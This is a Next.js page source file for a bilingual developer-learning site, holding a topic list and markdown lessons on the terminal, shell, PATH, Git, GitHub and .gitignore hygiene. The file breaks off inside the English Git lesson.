import Link from 'next/link'
import { notFound } from 'next/navigation'
import type { Metadata } from 'next'
import MarkdownContent from '@/components/MarkdownContent'

// 29 temas organizados por nivel
const sections = [
  { slug: 'terminal', titleEs: 'Terminal & Shell', titleEn: 'Terminal & Shell', level: 'aprendiz', icon: '🖥️' },
  { slug: 'git', titleEs: 'Git & GitHub', titleEn: 'Git & GitHub', level: 'aprendiz', icon: '📚' },
  { slug: 'editors', titleEs: 'Editores de Código', titleEn: 'Code Editors', level: 'aprendiz', icon: '⌨️' },
  { slug: 'homebrew', titleEs: 'Homebrew & Gestores', titleEn: 'Homebrew & Package Managers', level: 'aprendiz', icon: '📦' },
  { slug: 'docker-intro', titleEs: 'Docker Básico', titleEn: 'Docker Basics', level: 'aprendiz', icon: '🐳' },
  { slug: 'llms-intro', titleEs: 'Intro a LLMs', titleEn: 'Intro to LLMs', level: 'aprendiz', icon: '🤖' },
  { slug: 'llms-models', titleEs: 'Modelos LLM: Guía 2026', titleEn: 'LLM Models: 2026 Guide', level: 'aprendiz', icon: '🧠' },
  { slug: 'generative-ai', titleEs: '¿Qué es la IA Generativa?', titleEn: 'What is Generative AI?', level: 'aprendiz', icon: '✨' },
  { slug: 'javascript', titleEs: 'JavaScript & TypeScript', titleEn: 'JavaScript & TypeScript', level: 'cocinero', icon: '📗' },
  { slug: 'nodejs', titleEs: 'Node.js & npm/pnpm', titleEn: 'Node.js & npm/pnpm', level: 'cocinero', icon: '📦' },
  { slug: 'python', titleEs: 'Python & uv', titleEn: 'Python & uv', level: 'cocinero', icon: '🐍' },
  { slug: 'html-css', titleEs: 'HTML & CSS', titleEn: 'HTML & CSS', level: 'cocinero', icon: '🎨' },
  { slug: 'react', titleEs: 'React', titleEn: 'React', level: 'cocinero', icon: '⚛️' },
  { slug: 'apis', titleEs: 'APIs REST', titleEn: 'REST APIs', level: 'cocinero', icon: '🔗' },
  { slug: 'embeddings', titleEs: 'Embeddings', titleEn: 'Embeddings', level: 'cocinero', icon: '🧮' },
  { slug: 'prompt-engineering', titleEs: 'Prompt Engineering', titleEn: 'Prompt Engineering', level: 'cocinero', icon: '📝' },
  { slug: 'system-design', titleEs: 'Diseño de Sistemas', titleEn: 'System Design', level: 'chef', icon: '🏗️' },
  { slug: 'performance', titleEs: 'Performance & Optimización', titleEn: 'Performance & Optimization', level: 'chef', icon: '⚡' },
  { slug: 'networking', titleEs: 'Redes & Protocolos', titleEn: 'Networking & Protocols', level: 'chef', icon: '🌐' },
  { slug: 'git-advanced', titleEs: 'Git Avanzado & Colaboración', titleEn: 'Advanced Git & Collaboration', level: 'chef', icon: '🔀' },
  { slug: 'nextjs', titleEs: 'Next.js', titleEn: 'Next.js', level: 'chef', icon: '▲' },
  { slug: 'auth', titleEs: 'Autenticación', titleEn: 'Authentication', level: 'chef', icon: '🔐' },
  { slug: 'webhooks', titleEs: 'Webhooks', titleEn: 'Webhooks', level: 'chef', icon: '🪝' },
  { slug: 'nestjs', titleEs: 'NestJS / FastAPI', titleEn: 'NestJS / FastAPI', level: 'chef', icon: '🏗️' },
  { slug: 'postgresql', titleEs: 'PostgreSQL', titleEn: 'PostgreSQL', level: 'chef', icon: '🐘' },
  { slug: 'redis', titleEs: 'Redis & Cache', titleEn: 'Redis & Cache', level: 'chef', icon: '⚡' },
  { slug: 'docker-compose', titleEs: 'Docker Compose', titleEn: 'Docker Compose', level: 'chef', icon: '🐳' },
  { slug: 'cicd', titleEs: 'CI/CD', titleEn: 'CI/CD', level: 'chef', icon: '🚀' },
  { slug: 'testing', titleEs: 'Testing Profesional', titleEn: 'Professional Testing', level: 'chef', icon: '🧪' },
  { slug: 'security', titleEs: 'Seguridad de Aplicaciones', titleEn: 'Application Security', level: 'chef', icon: '🛡️' },
  { slug: 'observability', titleEs: 'Observabilidad', titleEn: 'Observability', level: 'chef', icon: '📊' },
  { slug: 'mobile', titleEs: 'React Native & Expo', titleEn: 'React Native & Expo', level: 'chef', icon: '📱' },
  { slug: 'iot', titleEs: 'IoT & Arduino', titleEn: 'IoT & Arduino', level: 'chef', icon: '🔌' },
  { slug: 'agentic-ai', titleEs: 'IA Agéntica', titleEn: 'Agentic AI', level: 'chef', icon: '🤖' },
  { slug: 'geo', titleEs: 'GEO: Generative Engine Optimization', titleEn: 'GEO: Generative Engine Optimization', level: 'chef', icon: '🔍' },
  { slug: 'vector-db', titleEs: 'Bases de Datos Vectoriales', titleEn: 'Vector Databases', level: 'master', icon: '🗄️' },
  { slug: 'rag', titleEs: 'RAG', titleEn: 'RAG', level: 'master', icon: '📚' },
  { slug: 'mcp', titleEs: 'MCP (Model Context Protocol)', titleEn: 'MCP (Model Context Protocol)', level: 'master', icon: '🔧' },
  { slug: 'agents', titleEs: 'Agentes IA', titleEn: 'AI Agents', level: 'master', icon: '🤖' },
  { slug: 'vision', titleEs: 'Vision & Multimodal', titleEn: 'Vision & Multimodal', level: 'master', icon: '👁️' },
]

const levelLabels = {
  aprendiz: { es: '🧑‍🎓 Aprendiz', en: '🧑‍🎓 Apprentice', color: 'bg-green-100 text-green-800' },
  cocinero: { es: '🧑‍🍳 Cocinero', en: '🧑‍🍳 Cook', color: 'bg-blue-100 text-blue-800' },
  chef: { es: '👨‍🍳 Chef', en: '👨‍🍳 Chef', color: 'bg-purple-100 text-purple-800' },
  master: { es: '👨‍🍳👑 Master Chef', en: '👨‍🍳👑 Master Chef', color: 'bg-amber-100 text-amber-800' },
}

// Contenido real (10% - muestra de calidad)
// Los demás mostrarán "Coming Soon"
const sectionsContent: Record<string, {
  contentEs: string
  contentEn: string
}> = {
  terminal: {
    contentEs: `
## Antes de cocinar, necesitas conocer tu cocina

Imagina que eres un chef. Antes de preparar un platillo, necesitas conocer tu cocina: dónde están los utensilios, cómo funciona cada uno, y por qué usas un cuchillo de chef en vez de una cuchara para picar verduras.

El desarrollo de software es igual. Tu computadora es la cocina. La Terminal es tu estación de trabajo principal. Y las herramientas que instalaremos son tus utensilios de precisión.

> **La diferencia entre un cocinero novato y un chef experimentado no es solo los platillos que preparan, sino qué tan bien conocen su cocina y sus herramientas.**

---

## La Terminal: Tu centro de comando

La Terminal es una ventana que te permite hablar directamente con tu computadora usando texto. En vez de clicks y ventanas, usas comandos escritos.

### ¿Cómo abrir la terminal?

| Sistema | Cómo abrirla | Nombre |
|---------|--------------|--------|
| **macOS** | Cmd + Espacio → "Terminal" | Terminal.app o iTerm2 |
| **Linux** | Ctrl + Alt + T | GNOME Terminal, Konsole |
| **Windows** | Win + X → Terminal | Windows Terminal, PowerShell |

> 💡 **Windows**: Recomendamos instalar [Windows Terminal](https://aka.ms/terminal) desde la Microsoft Store. Es moderno y soporta tabs.

### Tu primer comando

Abre Terminal y escribe:

\`\`\`bash
echo "Hola, soy desarrollador"
\`\`\`

Acabas de darle una instrucción a tu computadora. \`echo\` significa "repite lo que te digo".

### Comandos esenciales

\`\`\`bash
# ¿Dónde estoy?
pwd

# ¿Qué hay aquí?
ls

# Ir a otra carpeta
cd Documents

# Volver atrás
cd ..

# Ir a home
cd ~
\`\`\`

> 💡 **Tip**: Presiona Tab para autocompletar nombres de archivos.

---

## El Shell: El intérprete

Cuando escribes en la Terminal, hay un programa que interpreta lo que escribes. Ese programa se llama **Shell**.

| Sistema | Shell por defecto | Alternativa |
|---------|-------------------|-------------|
| **macOS** | zsh | bash, fish |
| **Linux** | bash | zsh, fish |
| **Windows** | PowerShell | Git Bash, WSL |

### Tu archivo de configuración

| Sistema | Shell | Archivo |
|---------|-------|---------|
| **macOS** | zsh | \`~/.zshrc\` |
| **Linux** | bash | \`~/.bashrc\` |
| **Windows** | PowerShell | \`$PROFILE\` |

---

## El PATH: El mapa de herramientas

Cuando escribes \`git\`, ¿cómo sabe tu computadora dónde está?

**PATH** es una lista de carpetas donde el sistema busca programas.

\`\`\`bash
# Ver tu PATH
echo $PATH
\`\`\`

> ⚠️ Si instalas algo y dice "command not found", probablemente necesitas agregar su carpeta al PATH.

---

## Enlaces útiles

- 📖 [Documentación oficial de zsh](https://zsh.sourceforge.io/Doc/)
- 🎓 [Tutorial interactivo de Terminal](https://www.terminaltutor.com/)
    `,
    contentEn: `
## Before cooking, you need to know your kitchen

Imagine you're a chef. Before preparing a dish, you need to know your kitchen: where the utensils are, how each one works, and why you use a chef's knife instead of a spoon to chop vegetables.

Software development is the same. Your computer is the kitchen. The Terminal is your main workstation. And the tools we'll install are your precision utensils.

> **The difference between a novice cook and an experienced chef isn't just the dishes they prepare, but how well they know their kitchen and tools.**

---

## The Terminal: Your command center

The Terminal is a window that lets you talk directly to your computer using text. Instead of clicks and windows, you use written commands.

### How to open the terminal?

| System | How to open | Name |
|--------|-------------|------|
| **macOS** | Cmd + Space → "Terminal" | Terminal.app or iTerm2 |
| **Linux** | Ctrl + Alt + T | GNOME Terminal, Konsole |
| **Windows** | Win + X → Terminal | Windows Terminal, PowerShell |

> 💡 **Windows**: We recommend installing [Windows Terminal](https://aka.ms/terminal) from the Microsoft Store. It's modern and supports tabs.

### Your first command

Open Terminal and type:

\`\`\`bash
echo "Hello, I am a developer"
\`\`\`

You just gave your computer an instruction. \`echo\` means "repeat what I tell you".

### Essential commands

\`\`\`bash
# Where am I?
pwd

# What's here?
ls

# Go to another folder
cd Documents

# Go back
cd ..

# Go home
cd ~
\`\`\`

> 💡 **Tip**: Press Tab to autocomplete file names.

---

## The Shell: The interpreter

When you type in Terminal, there's a program that interprets what you write. That program is called the **Shell**.

| System | Default shell | Alternative |
|--------|---------------|-------------|
| **macOS** | zsh | bash, fish |
| **Linux** | bash | zsh, fish |
| **Windows** | PowerShell | Git Bash, WSL |

### Your configuration file

| System | Shell | File |
|--------|-------|------|
| **macOS** | zsh | \`~/.zshrc\` |
| **Linux** | bash | \`~/.bashrc\` |
| **Windows** | PowerShell | \`$PROFILE\` |

---

## PATH: The tools map

When you type \`git\`, how does your computer know where it is?

**PATH** is a list of folders where the system looks for programs.

\`\`\`bash
# View your PATH
echo $PATH
\`\`\`

> ⚠️ If you install something and it says "command not found", you probably need to add its folder to PATH.

---

## Useful links

- 📖 [Official zsh documentation](https://zsh.sourceforge.io/Doc/)
- 🎓 [Interactive Terminal tutorial](https://www.terminaltutor.com/)
    `,
  },
  git: {
    contentEs: `
## ¿Por qué desde el primer proyecto?

"Es solo un proyectito pequeño, no necesito Git..."

**Error.** Usa Git desde el día 1, aunque sea un script de 10 líneas. ¿Por qué?

| Lo que piensas | Lo que pasa en realidad |
|----------------|------------------------|
| "Es muy simple" | Crece más de lo esperado |
| "Me acuerdo de todo" | En 2 semanas no recuerdas por qué cambiaste algo |
| "Tengo backup en Drive" | Drive no te dice qué cambió entre versiones |
| "Lo configuro después" | "Después" nunca llega, y cuando lo necesitas es tarde |

---

## 🤖 Git te salva de la IA

Esto es **crítico** si usas asistentes de código como Cursor, Claude Code, o Copilot:

| Situación | Sin Git | Con Git |
|-----------|---------|---------|
| La IA malinterpretó tu prompt y borró código importante | 😱 Perdido | \`git checkout -- .\` |
| El agente "mejoró" algo que funcionaba y ahora no compila | 😱 A reescribir | \`git diff\` para ver qué cambió |
| Pediste un cambio pequeño y modificó 15 archivos | 😱 Caos | \`git stash\` y empiezas de nuevo |
| Después de 5 prompts, todo está peor que al inicio | 😱 Frustración | \`git reset --hard HEAD~5\` |

> ⚠️ **Realidad**: Los agentes de IA son poderosos pero cometen errores. Un prompt ambiguo puede resultar en cambios destructivos. Git es tu red de seguridad.

**Flujo recomendado con IA:**
\`\`\`bash
# ANTES de pedirle algo a la IA
git add . && git commit -m "Checkpoint antes de cambios con IA"

# Si la IA rompe algo
git diff                    # Ver qué cambió
git checkout -- archivo.js  # Revertir un archivo
git reset --hard HEAD       # Revertir TODO al último commit
\`\`\`

---

> **Nuestra recomendación**: \`git init\` es el PRIMER comando en cualquier proyecto. Antes de escribir código, antes de instalar dependencias. Primero Git.

---

## Git ≠ GitHub: La diferencia fundamental

Antes de ver comandos, entiende esto:

| | **Git** | **GitHub** |
|---|---------|------------|
| **¿Qué es?** | Software en tu computadora | Sitio web / servicio en la nube |
| **¿Dónde vive?** | Local (tu máquina) | Remoto (internet) |
| **¿Quién lo creó?** | Linus Torvalds (2005) | Microsoft (comprado en 2018) |
| **¿Costo?** | Gratis, open source | Gratis + planes de pago |
| **¿Se necesitan mutuamente?** | Git funciona sin GitHub | GitHub necesita Git |

**Analogía**: Git es tu diario personal donde escribes todos los días. GitHub es la caja de seguridad del banco donde guardas una copia.

---

## ¿Para qué sirven realmente?

### Git (local) te permite:

| Uso | Ejemplo |
|-----|---------|
| 📸 **Historial completo** | Ver exactamente qué cambió, cuándo y por qué |
| ⏪ **Volver en el tiempo** | "Ayer funcionaba, ¿qué rompí hoy?" |
| 🔀 **Experimentar sin miedo** | Crear branches para probar ideas locas |
| 🔍 **Encontrar bugs** | "¿En qué commit se introdujo este error?" |
| 📝 **Documentar decisiones** | Los mensajes de commit son documentación |

### GitHub (remoto) te permite:

| Uso | Ejemplo |
|-----|---------|
| ☁️ **Backup en la nube** | Si te roban la laptop, tu código está seguro |
| 👥 **Colaborar** | Varios devs trabajando en el mismo proyecto |
| 🔍 **Code review** | Pull Requests para revisar antes de integrar |
| 🌐 **Portfolio** | Tu perfil muestra tu actividad y proyectos |
| 🚀 **Deploy automático** | GitHub Actions, Vercel, etc. |

---

## ¿Cuándo necesitas solo Git?

✅ **Solo Git es suficiente cuando:**
- Trabajas solo en tu máquina
- El proyecto es personal/experimental
- No necesitas backup remoto (pero deberías...)
- Estás aprendiendo

---

## ¿Cuándo necesitas GitHub?

✅ **Agrega GitHub cuando:**
- Quieres backup (¡siempre recomendado!)
- Trabajas en equipo
- El proyecto es open source
- Quieres mostrar tu trabajo (portfolio)
- Necesitas CI/CD (tests automáticos, deploy)

---

## Escenario real: Te roban la laptop 💻🔓

| Situación | Sin GitHub | Con GitHub |
|-----------|------------|------------|
| **Tu código** | Perdido para siempre | Haces \`git clone\` y sigues |
| **Historial** | Perdido | Intacto en la nube |
| **Tiempo perdido** | Semanas/meses de trabajo | 5 minutos en clonar |

**Moraleja**: Git local + GitHub remoto = tranquilidad.

---

## Instalación

| Sistema | Comando |
|---------|---------|
| **macOS** | \`brew install git\` |
| **Linux** | \`sudo apt install git\` |
| **Windows** | \`winget install Git.Git\` |

## Configuración inicial

\`\`\`bash
# Identidad (aparece en cada commit)
git config --global user.name "Tu Nombre"
git config --global user.email "tu@email.com"

# Branch por defecto
git config --global init.defaultBranch main

# Editor para mensajes largos
git config --global core.editor "code --wait"
\`\`\`

---

## Conceptos clave

| Concepto | Qué es | Analogía |
|----------|--------|----------|
| **Repository** | Carpeta con historial Git | Álbum de fotos |
| **Commit** | Foto del estado actual | Foto fechada en el álbum |
| **Branch** | Línea alternativa de desarrollo | Borrador de un capítulo |
| **Merge** | Unir dos branches | Integrar el borrador al libro |
| **Remote** | Conexión a GitHub/GitLab | Copia en la nube |
| **Clone** | Descargar repo remoto | Copiar álbum del banco |
| **Push** | Subir commits al remoto | Llevar fotos nuevas al banco |
| **Pull** | Bajar commits del remoto | Traer fotos que otros subieron |

---

## Flujo de trabajo

### Solo Git (local)

\`\`\`bash
# Crear repositorio
git init mi-proyecto
cd mi-proyecto

# Trabajar...
echo "# Mi Proyecto" > README.md

# Ver qué cambió
git status

# Agregar al staging
git add README.md    # archivo específico
git add .            # todos los cambios

# Crear commit
git commit -m "Inicial: agrega README"

# Ver historial
git log --oneline
\`\`\`

### Git + GitHub (local + remoto)

\`\`\`bash
# Conectar con GitHub (una vez)
git remote add origin https://github.com/tu-usuario/tu-repo.git

# Subir tu código
git push -u origin main

# Después de cada sesión de trabajo:
git add .
git commit -m "Describe qué hiciste"
git push
\`\`\`

---

## Branches: Experimentar sin miedo

\`\`\`bash
# Crear branch para nueva feature
git checkout -b feature/login

# Trabajar en la feature...
git add .
git commit -m "Agrega formulario de login"

# Volver a main
git checkout main

# Integrar la feature
git merge feature/login

# Borrar branch (ya no la necesitas)
git branch -d feature/login
\`\`\`

---

## GitHub CLI (gh)

\`\`\`bash
# Instalar
brew install gh

# Autenticar (abre navegador)
gh auth login

# Clonar repo
gh repo clone usuario/repo

# Crear repo desde carpeta actual
gh repo create mi-proyecto --public --source=.

# Crear Pull Request
gh pr create --fill
\`\`\`

---

## Comandos de emergencia

\`\`\`bash
# "La cagué, quiero volver al último commit"
git checkout -- .

# "Quiero ver cómo estaba hace 3 commits"
git checkout HEAD~3

# "¿Quién escribió esta línea?"
git blame archivo.js

# "¿En qué commit se rompió?"
git bisect start
git bisect bad          # el actual está mal
git bisect good abc123  # este commit estaba bien
# Git encuentra el culpable automáticamente
\`\`\`

---

## Resumen visual

\`\`\`
    TU COMPUTADORA                          GITHUB (NUBE)
    ──────────────                          ─────────────

    📁 Working Directory
         │
         │ git add
         ▼
    📦 Staging Area
         │
         │ git commit
         ▼
    📚 Local Repository  ──── git push ───▶ ☁️ Remote Repository
                         ◀── git pull ────
\`\`\`

---

## 🔐 .gitignore: Tu escudo contra filtraciones

El archivo \`.gitignore\` le dice a Git qué archivos **NUNCA** debe rastrear. Esto es **CRÍTICO** para seguridad.

### ⚠️ Peligro real: La IA y tus secretos

Los asistentes de IA (Cursor, Claude Code, Copilot) pueden accidentalmente:

| Situación peligrosa | Consecuencia |
|---------------------|--------------|
| Agregar \`.env\` al commit | Tus API keys quedan públicas |
| Crear archivo con credenciales hardcodeadas | Cualquiera puede verlas en GitHub |
| "Mejorar" código moviendo secrets a archivos nuevos | El \`.gitignore\` no los cubre |

> 🚨 **Historia real**: Miles de API keys de AWS se filtran cada día en GitHub. Bots escanean repos públicos buscando credenciales. Tu cuenta puede ser hackeada en minutos.

### Archivo .gitignore esencial

Crea esto en la raíz de CADA proyecto:

\`\`\`bash
# .gitignore

# Variables de entorno (SECRETS!)
.env
.env.local
.env.*.local
*.env

# Credenciales
credentials.json
*-credentials.json
*.pem
*.key
secrets/

# Dependencias (se reinstalan)
node_modules/
venv/
__pycache__/

# Build (se regenera)
dist/
build/
.next/
.output/

# IDE
.vscode/
.idea/
*.swp

# OS
.DS_Store
Thumbs.db

# Logs
*.log
npm-debug.log*
\`\`\`

### Comandos útiles

\`\`\`bash
# Ver qué está ignorando Git
git status --ignored

# Si ya commiteaste un archivo con secretos 😱
git rm --cached .env
git commit -m "Remove .env from tracking"
# IMPORTANTE: El archivo sigue en el historial!
# Cambia TODAS las credenciales que se filtraron

# Verificar antes de push
git diff --staged   # Ver qué vas a subir
\`\`\`

### Regla de oro

> **NUNCA** pongas credenciales directamente en el código. Usa variables de entorno (\`.env\`) y asegúrate de que \`.env\` esté en \`.gitignore\` ANTES del primer commit.

---

## 💼 GitHub como portfolio profesional

Tu perfil de GitHub es más importante de lo que crees:

| Situación | Qué miran |
|-----------|-----------|
| **Aplicar a trabajo** | Reclutadores revisan tu GitHub antes de la entrevista |
| **Freelance** | Clientes quieren ver proyectos reales funcionando |
| **Licitaciones** | Las empresas evalúan calidad de código y documentación |

### ¿Qué hace un repo "profesional"?

\`\`\`
mi-proyecto/
├── README.md          # ⭐ CRÍTICO: Qué hace, cómo instalar, screenshots
├── LICENSE            # MIT, Apache, etc.
├── .gitignore         # Limpio, sin node_modules ni .env
├── docs/              # Arquitectura, decisiones técnicas
│   └── ARCHITECTURE.md
├── src/               # Código organizado
├── tests/             # ⭐ Tests demuestran profesionalismo
└── .github/
    └── workflows/     # CI/CD muestra que sabes DevOps
\`\`\`

### Checklist de repo de portfolio

- [ ] README con descripción clara y screenshots/GIFs
- [ ] Instrucciones de instalación que FUNCIONAN
- [ ] Tests (aunque sean básicos)
- [ ] Código limpio y comentado donde hace falta
- [ ] Sin secretos ni credenciales (revisa el historial!)
- [ ] Commits con mensajes descriptivos (no "fix", "update")

> 💡 **Tip**: 3-5 repos públicos bien hechos impresionan más que 50 repos abandonados.

### Tu perfil de GitHub

Crea un repo con tu username (ej: \`alannreyes/alannreyes\`) con un README.md que aparece en tu perfil:

\`\`\`markdown
# 👋 Hola, soy [Tu Nombre]

🔭 Actualmente trabajando en...
🌱 Aprendiendo...
💬 Pregúntame sobre...
📫 Contáctame: tu@email.com
\`\`\`

---

## 🍳 Practica: Tu primer repositorio

¿Listo para aplicar todo esto?

→ **[Mi Primer Repositorio](/es/cooking/first-repo)** — Crea y sube tu primer repo a GitHub paso a paso

---

## 📚 Siguiente nivel

→ **[Git Avanzado & Colaboración](/es/learning/git-advanced)** — PRs, merge conflicts, rebases y trabajo en equipo

---

## Enlaces útiles

- 📖 [Git - Documentación oficial](https://git-scm.com/doc)
- 🎓 [Learn Git Branching (interactivo)](https://learngitbranching.js.org/)
- 📘 [GitHub Docs](https://docs.github.com)
- 📘 [gitignore.io](https://www.toptal.com/developers/gitignore) — Genera .gitignore para tu stack
- 🎥 [Git en 15 minutos (video)](https://www.youtube.com/watch?v=USjZcfj8yxE)
    `,
    contentEn: `
## Why from your first project?

"It's just a tiny project, I don't need Git..."

**Wrong.** Use Git from day 1, even for a 10-line script. Why?

| What you think | What actually happens |
|----------------|----------------------|
| "It's too simple" | It grows more than expected |
| "I'll remember everything" | In 2 weeks you won't remember why you changed something |
| "I have backup on Drive" | Drive doesn't tell you what changed between versions |
| "I'll set it up later" | "Later" never comes, and when you need it, it's too late |

---

## 🤖 Git saves you from AI

This is **critical** if you use code assistants like Cursor, Claude Code, or Copilot:

| Situation | Without Git | With Git |
|-----------|-------------|----------|
| AI misunderstood your prompt and deleted important code | 😱 Lost | \`git checkout -- .\` |
| The agent "improved" something that worked and now it won't compile | 😱 Rewrite it | \`git diff\` to see what changed |
| You asked for a small change and it modified 15 files | 😱 Chaos | \`git stash\` and start over |
| After 5 prompts, everything is worse than before | 😱 Frustration | \`git reset --hard HEAD~5\` |

> ⚠️ **Reality**: AI agents are powerful but make mistakes. An ambiguous prompt can result in destructive changes. Git is your safety net.

**Recommended workflow with AI:**
\`\`\`bash
# BEFORE asking the AI for something
git add . && git commit -m "Checkpoint before AI changes"

# If the AI breaks something
git diff                    # See what changed
git checkout -- file.js     # Revert one file
git reset --hard HEAD       # Revert EVERYTHING to last commit
\`\`\`

---

> **Our recommendation**: \`git init\` is the FIRST command in any project. Before writing code, before installing dependencies. Git first.

---

## Git ≠ GitHub: The fundamental difference

Before looking at commands, understand this:

| | **Git** | **GitHub** |
|---|---------|------------|
| **What is it?** | Software on your computer | Website / cloud service |
| **Where does it live?** | Local (your machine) | Remote (internet) |
| **Who created it?** | Linus Torvalds (2005) | Microsoft (acquired 2018) |
| **Cost?** | Free, open source | Free + paid plans |
| **Do they need each other?** | Git works without GitHub | GitHub needs Git |

**Analogy**: Git is your personal journal where you write every day. GitHub is the bank's safety deposit box where you keep a copy.

---

## What are they really for?

### Git (local) allows you to:

| Use | Example |
|-----|---------|
| 📸 **Complete history** | See exactly what changed, when, and why |
| ⏪ **Go back in time** | "It worked yesterday, what did I break today?" |
| 🔀 **Experiment fearlessly** | Create branches to try crazy ideas |
| 🔍 **Find bugs** | "Which commit introduced this error?" |
| 📝 **Document decisions** | Commit messages are documentation |

### GitHub (remote) allows you to:

| Use | Example |
|-----|---------|
| ☁️ **Cloud backup** | If your laptop gets stolen, your code is safe |
| 👥 **Collaborate** | Multiple devs working on the same project |
| 🔍 **Code review** | Pull Requests to review before merging |
| 🌐 **Portfolio** | Your profile shows your activity and projects |
| 🚀 **Auto deploy** | GitHub Actions, Vercel, etc. |

---

## When do you only need Git?

✅ **Git alone is enough when:**
- You work solo on your machine
- The project is personal/experimental
- You don't need remote backup (but you should...)
- You're learning

---

## When do you need GitHub?

✅ **Add GitHub when:**
- You want backup (always recommended!)
- You work in a team
- The project is open source
- You want to showcase your work (portfolio)
- You need CI/CD (automated tests, deploy)

---

## Real scenario: Your laptop gets stolen 💻🔓

| Situation | Without GitHub | With GitHub |
|-----------|----------------|-------------|
| **Your code** | Lost forever | \`git clone\` and continue |
| **History** | Lost | Intact in the cloud |
| **Time lost** | Weeks/months of work | 5 minutes to clone |

**Moral**: Local Git + remote GitHub = peace of mind.

---

## Installation

| System | Command |
|--------|---------|
| **macOS** | \`brew install git\` |
| **Linux** | \`sudo apt install git\` |
| **Windows** | \`winget install Git.Git\` |

## Initial setup

\`\`\`bash
# Identity (appears in every commit)
git config --global user.name "Your Name"
git config --global user.email "your@email.com"

# Default branch
git config --global init.defaultBranch main

# Editor for long messages
git config --global core.editor "code --wait"
\`\`\`

---

## Key concepts

| Concept | What it is | Analogy |
|---------|------------|---------|
| **Repository** | Folder with Git history | Photo album |
| **Commit** | Snapshot of current state | Dated photo in album |
| **Branch** | Alternative development line | Draft of a chapter |
| **Merge** | Join two branches | Integrate draft into book |
| **Remote** | Connection to GitHub/GitLab | Cloud copy |
| **Clone** | Download remote repo | Copy album from bank |
| **Push** | Upload commits to remote | Take new photos to bank |
| **Pull** | Download commits from remote | Get photos others uploaded |

---

## Workflow

### Git only (local)

\`\`\`bash
# Create repository
git init my-project
cd my-project

# Work...
echo "# My Project" > README.md

# See what changed
git status

# Add to staging
git add README.md    # specific file
git add .            # all changes

# Create commit
git commit -m "Initial: add README"

# View history
git log --oneline
\`\`\`

### Git + GitHub (local + remote)

\`\`\`bash
# Connect to GitHub (once)
git remote add origin https://github.com/your-user/your-repo.git

# Push your code
git push -u origin main

# After each work session:
git add .
git commit -m "Describe what you did"
git push
\`\`\`

---

## Branches: Experiment fearlessly

\`\`\`bash
# Create branch for new feature
git checkout -b feature/login

# Work on the feature...
git add .
git commit -m "Add login form"

# Go back to main
git checkout main

# Integrate the feature
git merge feature/login

# Delete branch (no longer needed)
git branch -d feature/login
\`\`\`

---

## GitHub CLI (gh)

\`\`\`bash
# Install
brew install gh

# Authenticate (opens browser)
gh auth login

# Clone repo
gh repo clone user/repo

# Create repo from current folder
gh repo create my-project --public --source=.

# Create Pull Request
gh pr create --fill
\`\`\`

---

## Emergency commands

\`\`\`bash
# "I messed up, I want to go back to last commit"
git checkout -- .

# "I want to see how it was 3 commits ago"
git checkout HEAD~3

# "Who wrote this line?"
git blame file.js

# "Which commit broke it?"
git bisect start
git bisect bad          # current is bad
git bisect good abc123  # this commit was good
# Git finds the culprit automatically
\`\`\`

---

## Visual summary

\`\`\`
    YOUR COMPUTER                           GITHUB (CLOUD)
    ─────────────                           ──────────────

    📁 Working Directory
         │
         │ git add
         ▼
    📦 Staging Area
         │
         │ git commit
         ▼
    📚 Local Repository  ──── git push ───▶ ☁️ Remote Repository
                         ◀── git pull ────
\`\`\`

---

## 🔐 .gitignore: Your shield against leaks

The \`.gitignore\` file tells Git which files to **NEVER** track. This is **CRITICAL** for security.

### ⚠️ Real danger: AI and your secrets

AI assistants (Cursor, Claude Code, Copilot) can accidentally:

| Dangerous situation | Consequence |
|---------------------|-------------|
| Add \`.env\` to commit | Your API keys become public |
| Create file with hardcoded credentials | Anyone can see them on GitHub |
| "Improve" code by moving secrets to new files | \`.gitignore\` doesn't cover them |

> 🚨 **True story**: Thousands of AWS API keys leak every day on GitHub. Bots scan public repos looking for credentials. Your account can be hacked within minutes.

### Essential .gitignore file

Create this at the root of EVERY project:

\`\`\`bash
# .gitignore

# Environment variables (SECRETS!)
.env
.env.local
.env.*.local
*.env

# Credentials
credentials.json
*-credentials.json
*.pem
*.key
secrets/

# Dependencies (reinstallable)
node_modules/
venv/
__pycache__/

# Build (regeneratable)
dist/
build/
.next/
.output/

# IDE
.vscode/
.idea/
*.swp

# OS
.DS_Store
Thumbs.db

# Logs
*.log
npm-debug.log*
\`\`\`

### Useful commands

\`\`\`bash
# See what Git is ignoring
git status --ignored

# If you already committed a file with secrets 😱
git rm --cached .env
git commit -m "Remove .env from tracking"
# IMPORTANT: The file is still in history!
# Change ALL credentials that were leaked

# Verify before push
git diff --staged   # See what you're about to push
\`\`\`

### Golden rule

> **NEVER** put credentials directly in code. Use environment variables (\`.env\`) and make sure \`.env\` is in \`.gitignore\` BEFORE the first commit.

---

## 💼 GitHub as a professional portfolio

Your GitHub profile is more important than you think:

| Situation | What they look at |
|-----------|-------------------|
| **Job applications** | Recruiters check your GitHub before interviews |
| **Freelancing** | Clients want to see real working projects |
| **Contract bids** | Companies evaluate code quality and documentation |

### What makes a repo "professional"?

\`\`\`
my-project/
├── README.md          # ⭐ CRITICAL: What it does, how to install, screenshots
├── LICENSE            # MIT, Apache, etc.
├── .gitignore         # Clean, no node_modules or .env
├── docs/              # Architecture, technical decisions
│   └── ARCHITECTURE.md
├── src/               # Organized code
├── tests/             # ⭐ Tests demonstrate professionalism
└── .github/
    └── workflows/     # CI/CD shows you know DevOps
\`\`\`

### Portfolio repo checklist

- [ ] README with clear description and screenshots/GIFs
- [ ] Installation instructions that WORK
- [ ] Tests (even basic ones)
- [ ] Clean code with comments where needed
- [ ] No secrets or credentials (check the history!)
- [ ] Commits with descriptive messages (not "fix", "update")

> 💡 **Tip**: 3-5 well-made public repos impress more than 50 abandoned ones.

### Your GitHub profile

Create a repo with your username (e.g., \`alannreyes/alannreyes\`) with a README.md that appears on your profile:

\`\`\`markdown
# 👋 Hi, I'm [Your Name]

🔭 Currently working on...
🌱 Learning...
💬 Ask me about...
📫 Contact me: your@email.com
\`\`\`

---

## 🍳 Practice: Your first repository

Ready to apply all this?

→ **[My First Repository](/en/cooking/first-repo)** — Create and push your first repo to GitHub step by step

---

## 📚 Next level

→ **[Advanced Git & Collaboration](/en/learning/git-advanced)** — PRs, merge conflicts, rebases and teamwork

---

## Useful links

- 📖 [Git - Official documentation](https://git-scm.com/doc)
- 🎓 [Learn Git Branching (interactive)](https://learngitbranching.js.org/)
- 📘 [GitHub Docs](https://docs.github.com)
- 📘 [gitignore.io](https://www.toptal.com/developers/gitignore) — Generate .gitignore for your stack
